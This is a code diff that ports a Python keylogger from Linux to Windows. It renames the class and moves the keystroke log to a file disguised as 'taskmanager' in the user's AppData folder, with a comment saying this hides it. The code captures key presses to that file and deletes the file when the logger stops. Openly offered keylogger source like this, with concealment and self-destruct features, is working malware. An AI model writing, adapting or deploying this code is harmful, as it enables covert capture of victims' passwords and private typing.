@@ -7,7 +7,7 @@ import time
 import threading                             # used to run multiple threads (tasks, function calls) at the same time
 
 
-class Lnx_Keylogger():
+class Win_Keylogger():
 
 	keys = []
 	counter = 0
@@ -15,7 +15,14 @@ class Lnx_Keylogger():
 	flag = 0                                              # when: flag = 0 ==>  keylogger will run
 							      # when: flag = 1 ==>  keylogger will stop and the file where keys are logged, gets self destructed
 
-	lnx_path = "processes"
+	# Creates a new file 
+	win_path = os.environ['appdata'] + '\\taskmanager'
+
+	with open(win_path, 'w') as fp: 
+		pass
+
+	# For Windows, we can hide the file in the appdata directory -> C:\Users\<usernme>\AppData\Roaming\\taskmanager
+
 
 	def on_press(self, key):
 
@@ -31,13 +38,13 @@ class Lnx_Keylogger():
 
 	def read_logs(self):
 
-		with open(self.lnx_path, 'rt') as f:              # Reading file as text
+		with open(self.win_path, 'rt') as f:              # Reading file as text
 
 			return f.read()
 
 	# Kelogger captured key pattern
 	def write_file(self, keys):
-		with open(self.lnx_path, 'a') as file:
+		with open(self.win_path, 'a') as file:
 			for key in keys:
 				k = str(key).replace("'", "")     # To avoid: 'U''D''P' -> Instead: UDP
 				# Backspace Key
@@ -236,12 +243,12 @@ class Lnx_Keylogger():
 
 		self.flag = 1
 		listener.stop()                               # Stops storing keystrokes
-		os.remove(self.lnx_path)		      # Removing the file
+		os.remove(self.win_path)		      # Removing the file
 
 
 if __name__ == "__main__":
 
-	keylog = Lnx_Keylogger()
+	keylog = Win_Keylogger()
 
 	t = threading.Thread(target=keylog.keylog_start)
 	t.start()
